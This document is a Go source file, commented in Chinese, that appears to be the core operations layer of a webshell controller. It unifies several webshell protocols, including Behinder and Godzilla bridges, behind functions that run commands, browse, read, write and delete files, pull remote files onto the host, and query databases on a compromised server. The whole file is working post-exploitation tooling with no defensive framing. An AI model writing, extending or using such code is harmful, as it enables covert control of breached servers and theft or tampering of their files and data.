// 能力层:把各通道原语(命令执行 / eval 代码 / 二进制读写操作码)组合成统一
// 高级操作面(目录/文件/信息/数据库)。策略固定三级:
//   ① 原生操作码(dsh-aes 的 u/d——二进制安全)
//   ② eval 片段(cmd-eval / dsh-aes v2 / 冰蝎与哥斯拉桥接——结构化 JSON,覆盖最全)
//   ③ 命令翻译(所有 cmd 能力通道兜底——ls/dir 解析、base64 分块)
package webshellproto

import (
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"time"
)

var osCache sync.Map   // connId → "linux"|"windows"
var evalCache sync.Map // connId → bool(eval 片段能力)

// uploadChunkRaw 命令通道分块(b64 后 32KB,留命令行余量)。
const uploadChunkRaw = 24000

// maxOutputBytes 大输出保护。
const maxOutputBytes = 8 << 20

// InvalidateConn 清理探测缓存(连接删除/编辑后)。
func InvalidateConn(connID string) {
	osCache.Delete(connID)
	evalCache.Delete(connID)
	GodzillaInvalidate(connID + "@")
	ClearCookies(connID)
}

// RunCommand 通道原生命令执行(所有协议统一入口)。
func RunCommand(conn *Conn, command string) (string, error) {
	switch conn.Protocol {
	case "dsh-aes":
		return DshAesCmd(conn, command)
	case "cmd-eval":
		return CmdPhpEval(conn, SnippetExec(command))
	case "cmd-system":
		return CmdSystemExec(conn, command)
	case "behinder":
		return BehinderEval(conn, SnippetExec(command))
	case "godzilla":
		return GodzillaEval(conn, SnippetExec(command))
	case "dsh-mem":
		return DshMemRun(conn, command)
	}
	return "", fmt.Errorf("通道 %s 暂不支持命令执行", conn.Protocol)
}

// CanEval eval 片段能力:桥接载荷通道恒真;dsh-aes 需 v2(e 操作码)探测一次。
func CanEval(conn *Conn) bool {
	if conn.Protocol == "cmd-eval" && conn.ShellLang == "php" {
		return true
	}
	if conn.Protocol == "behinder" || conn.Protocol == "godzilla" {
		return true
	}
	if conn.Protocol != "dsh-aes" {
		return false
	}
	key := conn.ID
	if key == "" {
		key = conn.URL
	}
	if v, ok := evalCache.Load(key); ok {
		return v.(bool)
	}
	v := DshAesProbeEval(conn)
	evalCache.Store(key, v)
	return v
}

// RunSnippet 执行 PHP 片段并提取结构化结果。
func RunSnippet(conn *Conn, code string) (*SnippetResult, error) {
	var out string
	var err error
	switch conn.Protocol {
	case "cmd-eval":
		out, err = CmdPhpEval(conn, code)
	case "dsh-aes":
		out, err = DshAesEval(conn, code)
	case "behinder":
		out, err = BehinderEval(conn, code)
	case "godzilla":
		out, err = GodzillaEval(conn, code)
	default:
		return nil, fmt.Errorf("当前通道无 eval 能力——仅 PHP eval 马与自研/桥接通道支持结构化操作")
	}
	if err != nil {
		return nil, err
	}
	return ExtractMarked(out), nil
}

// OSOf OS 解析:连接配置显式指定优先,auto 则探测一次。
func OSOf(conn *Conn) (string, error) {
	if conn.OS == "linux" || conn.OS == "windows" {
		return conn.OS, nil
	}
	key := conn.ID
	if key == "" {
		key = conn.URL
	}
	if v, ok := osCache.Load(key); ok {
		return v.(string), nil
	}
	out, err := RunCommand(conn, OSProbeCommand)
	if err != nil {
		return "", err
	}
	parsed := ParseOsProbe(out)
	if parsed == "" {
		return "", fmt.Errorf("OS 探测失败:无法识别回显")
	}
	osCache.Store(key, parsed)
	return parsed, nil
}

// BasicInfo 基本信息(结构化优先)。
func BasicInfo(conn *Conn) (map[string]any, error) {
	if CanEval(conn) {
		r, err := RunSnippet(conn, SnippetBasicInfo())
		if err == nil && r != nil && r.Error() == "" {
			return r.Raw, nil
		}
	}
	osName, err := OSOf(conn)
	if err != nil {
		return nil, err
	}
	out, err := RunCommand(conn, BasicInfoCommand(osName))
	if err != nil {
		return nil, err
	}
	lines := strings.Split(strings.TrimSpace(out), "\n")
	info := map[string]any{"os": osName}
	if len(lines) > 0 {
		info["user"] = strings.TrimSpace(lines[0])
	}
	if len(lines) > 1 {
		info["cwd"] = strings.TrimSpace(lines[1])
	}
	if len(lines) > 2 {
		info["uname"] = strings.TrimSpace(strings.Join(lines[2:], " | "))
	}
	return info, nil
}

// FileEntry 统一文件条目。
type FileEntry struct {
	Name     string `json:"name"`
	IsDir    bool   `json:"is_dir"`
	Size     int64  `json:"size"`
	Perm     string `json:"perm,omitempty"`
	Owner    string `json:"owner,omitempty"`
	Mtime    string `json:"mtime,omitempty"`
	Epoch    int64  `json:"epoch,omitempty"`
	Writable *bool  `json:"writable,omitempty"`
}

// ListDir 目录列表。
func ListDir(conn *Conn, path string) ([]FileEntry, error) {
	if CanEval(conn) {
		r, err := RunSnippet(conn, SnippetLs(path))
		if err == nil && r != nil {
			if r.IsList {
				out := make([]FileEntry, 0, len(r.RawList))
				for _, item := range r.RawList {
					m, ok := item.(map[string]any)
					if !ok {
						continue
					}
					e := FileEntry{
						Name: asString(m["n"]),
						IsDir: asBool(m["d"]),
						Size: asInt64(m["s"]),
						Perm: asString(m["p"]),
						Mtime: epochToTime(asInt64(m["m"])),
						Epoch: asInt64(m["m"]),
					}
					w := asBool(m["w"])
					e.Writable = &w
					out = append(out, e)
				}
				return out, nil
			}
			if r.Error() != "" {
				return nil, fmt.Errorf("列目录失败:%s", r.Error())
			}
		}
	}
	osName, err := OSOf(conn)
	if err != nil {
		return nil, err
	}
	out, err := RunCommand(conn, mustCmd(BuildFileCommand("ls", FileArgs{Path: path}, osName)))
	if err != nil {
		return nil, err
	}
	var entries []DirEntry
	if osName == "windows" {
		entries = ParseDir(out)
	} else {
		entries = ParseLs(out)
	}
	result := make([]FileEntry, 0, len(entries))
	for _, e := range entries {
		result = append(result, FileEntry{Name: e.Name, IsDir: e.IsDir, Size: e.Size, Perm: e.Perm, Owner: e.Owner, Mtime: e.Mtime})
	}
	return result, nil
}

// ReadFile 读文件(二进制安全)。
func ReadFile(conn *Conn, path string) ([]byte, error) {
	if conn.Protocol == "dsh-aes" {
		buf, err := DshAesReadFile(conn, path)
		if err != nil {
			return nil, err
		}
		if len(buf) > maxOutputBytes {
			return nil, ErrOutputTooBig
		}
		return buf, nil
	}
	if CanEval(conn) {
		r, err := RunSnippet(conn, SnippetRead(path))
		if err == nil && r != nil {
			if r.Error() != "" {
				return nil, fmt.Errorf("读取失败:%s", r.Error())
			}
			if r.B64Buffer != "" {
				buf, err := Unb64(r.B64Buffer)
				if err != nil {
					return nil, fmt.Errorf("读取解码失败")
				}
				if len(buf) > maxOutputBytes {
					return nil, ErrOutputTooBig
				}
				return buf, nil
			}
		}
	}
	osName, err := OSOf(conn)
	if err != nil {
		return nil, err
	}
	out, err := RunCommand(conn, mustCmd(BuildFileCommand("read", FileArgs{Path: path}, osName)))
	if err != nil {
		return nil, err
	}
	return Unb64(CleanB64Output(out))
}

// WriteFile 写文件(二进制安全,自动分块)。
func WriteFile(conn *Conn, path string, data []byte) error {
	if conn.Protocol == "dsh-aes" {
		return DshAesWriteFile(conn, path, data)
	}
	canEval := CanEval(conn)
	osName := ""
	if !canEval {
		var err error
		if osName, err = OSOf(conn); err != nil {
			return err
		}
	}
	// do-while 语义:空文件也写一轮(file_put_contents 空串=创建空文件)
	off := 0
	first := true
	for {
		end := off + uploadChunkRaw
		if end > len(data) {
			end = len(data)
		}
		chunk := data[off:end]
		chunkB64 := B64(chunk)
		if canEval {
			var code string
			if first {
				code = SnippetWrite(path, chunkB64)
			} else {
				code = SnippetAppend(path, chunkB64)
			}
			r, err := RunSnippet(conn, code)
			if err != nil {
				return err
			}
			if r != nil && r.Get("ok") == false {
				return fmt.Errorf("马侧写入失败")
			}
		} else {
			action := "write-first"
			if !first {
				action = "write-append"
			}
			cmd, err := BuildFileCommand(action, FileArgs{Path: path, B64: chunkB64}, osName)
			if err != nil {
				return err
			}
			if _, err := RunCommand(conn, cmd); err != nil {
				return err
			}
		}
		off = end
		first = false
		if off >= len(data) {
			break
		}
	}
	return nil
}

// FileAction 通用文件动作(删除/建目录/移动/复制/权限/时间戳/远程下载/校验/根)。
func FileAction(conn *Conn, action string, a FileArgs) (map[string]any, error) {
	var snippet string
	switch action {
	case "delete", "delete-dir":
		snippet = SnippetDelete(a.Path)
	case "mkdir":
		snippet = SnippetMkdir(a.Path)
	case "mv":
		snippet = SnippetMv(a.From, a.To)
	case "copy":
		snippet = SnippetCopy(a.From, a.To)
	case "chmod":
		snippet = SnippetChmod(a.Path, a.Mode)
	case "touch":
		snippet = SnippetTouch(a.Path, a.Epoch)
	case "stat":
		snippet = SnippetStat(a.Path)
	case "wget":
		snippet = SnippetWget(a.URL, a.To)
	case "hash":
		snippet = SnippetHash(a.Path)
	case "roots":
		snippet = SnippetRoots()
	default:
		return nil, fmt.Errorf("未知文件动作 %s", action)
	}
	if CanEval(conn) {
		r, err := RunSnippet(conn, snippet)
		if err == nil && r != nil {
			if r.Error() != "" {
				return nil, fmt.Errorf("操作失败:%s", r.Error())
			}
			if r.IsList {
				return map[string]any{"roots": r.RawList}, nil
			}
			return r.Raw, nil
		}
	}
	osName, err := OSOf(conn)
	if err != nil {
		return nil, err
	}
	if action == "roots" {
		if osName == "windows" {
			return map[string]any{"roots": []string{`C:\`}}, nil
		}
		return map[string]any{"roots": []string{"/"}}, nil
	}
	cmdAction := action
	if action == "delete-dir" {
		cmdAction = "delete-dir"
	}
	cmd, err := BuildFileCommand(cmdAction, a, osName)
	if err != nil {
		return nil, err
	}
	out, err := RunCommand(conn, cmd)
	if err != nil {
		return nil, err
	}
	switch action {
	case "stat":
		parts := strings.Split(strings.TrimSpace(out), "|")
		res := map[string]any{}
		if len(parts) > 0 {
			res["epoch"] = parseInt64(parts[0])
		}
		if len(parts) > 2 {
			res["mtime"] = time.Unix(parseInt64(parts[0]), 0).UTC().Format("2006-01-02 15:04:05")
		}
		return res, nil
	case "hash":
		lower := strings.ToLower(out)
		if i := strings.Index(lower, "md5"); i >= 0 {
			seg := strings.TrimSpace(out[i+3:])
			hash := ""
			for _, c := range seg {
				if len(hash) == 32 {
					break
				}
				if (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F') {
					hash += string(c)
				} else if hash != "" {
					break
				}
			}
			return map[string]any{"md5": hash}, nil
		}
		return map[string]any{"md5": ""}, nil
	}
	return map[string]any{"ok": true, "output": strings.TrimSpace(out)}, nil
}

// DbQuery 执行 SQL。
func DbQuery(conn *Conn, profile DBProfile, sql string) (map[string]any, error) {
	r, err := RunSnippet(conn, SnippetDbQuery(profile, sql))
	if err != nil {
		return nil, err
	}
	if r == nil {
		return nil, fmt.Errorf("SQL 执行失败:无回显")
	}
	if r.Error() != "" {
		return nil, fmt.Errorf("SQL 执行失败:%s", r.Error())
	}
	return r.Raw, nil
}

// DbDatabases 库列表。
func DbDatabases(conn *Conn, profile DBProfile) ([]string, error) {
	r, err := RunSnippet(conn, SnippetDbDatabases(profile))
	if err != nil {
		return nil, err
	}
	if r != nil && r.Error() != "" {
		return nil, fmt.Errorf("库列表失败:%s", r.Error())
	}
	out := []string{}
	if r != nil {
		if list, ok := r.Raw["databases"].([]any); ok {
			for _, v := range list {
				out = append(out, asString(v))
			}
		}
	}
	return out, nil
}

// DbTables 表列表。
func DbTables(conn *Conn, profile DBProfile, database string) ([]string, error) {
	r, err := RunSnippet(conn, SnippetDbTables(profile, database))
	if err != nil {
		return nil, err
	}
	if r != nil && r.Error() != "" {
		return nil, fmt.Errorf("表列表失败:%s", r.Error())
	}
	out := []string{}
	if r != nil {
		if list, ok := r.Raw["tables"].([]any); ok {
			for _, v := range list {
				out = append(out, asString(v))
			}
		}
	}
	return out, nil
}

// DbTableInfo 表结构。
func DbTableInfo(conn *Conn, profile DBProfile, database, table string) (map[string]any, error) {
	r, err := RunSnippet(conn, SnippetDbTableInfo(profile, database, table))
	if err != nil {
		return nil, err
	}
	if r != nil && r.Error() != "" {
		return nil, fmt.Errorf("表结构失败:%s", r.Error())
	}
	return r.Raw, nil
}

func mustCmd(cmd string, err error) string {
	if err != nil {
		return ""
	}
	return cmd
}

func asString(v any) string {
	if s, ok := v.(string); ok {
		return s
	}
	if v == nil {
		return ""
	}
	b, _ := json.Marshal(v)
	return strings.Trim(string(b), `"`)
}

func asBool(v any) bool {
	b, _ := v.(bool)
	return b
}

func asInt64(v any) int64 {
	switch n := v.(type) {
	case float64:
		return int64(n)
	case int64:
		return n
	case int:
		return int64(n)
	case string:
		return parseInt64(n)
	}
	return 0
}

func parseInt64(s string) int64 {
	var n int64
	for _, c := range strings.TrimSpace(s) {
		if c < '0' || c > '9' {
			return 0
		}
		n = n*10 + int64(c-'0')
	}
	return n
}

func epochToTime(epoch int64) string {
	if epoch <= 0 {
		return ""
	}
	return time.Unix(epoch, 0).UTC().Format("2006-01-02 15:04:05")
}
